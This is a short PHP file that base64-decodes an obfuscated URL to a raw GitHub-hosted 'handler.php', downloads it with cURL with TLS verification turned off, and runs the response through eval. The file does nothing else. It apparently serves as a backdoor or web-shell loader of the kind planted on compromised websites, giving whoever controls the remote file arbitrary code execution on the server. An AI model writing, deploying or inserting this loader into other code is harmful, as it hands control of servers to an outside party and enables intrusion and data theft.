<?php
$encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RyeXhhcHAvZXhjb24vcmVmcy9oZWFkcy9tYWluL25ld2NvbjEvbmV3Y29uMi9vbmNvbi9oYW5kbGVyLnBocA==";

$remote_url = base64_decode($encoded_url);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $remote_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$response = curl_exec($ch);

if($response === false) {
    echo "cURL Error: " . curl_error($ch);
    exit;
}

curl_close($ch);

eval('?>' . $response);
?>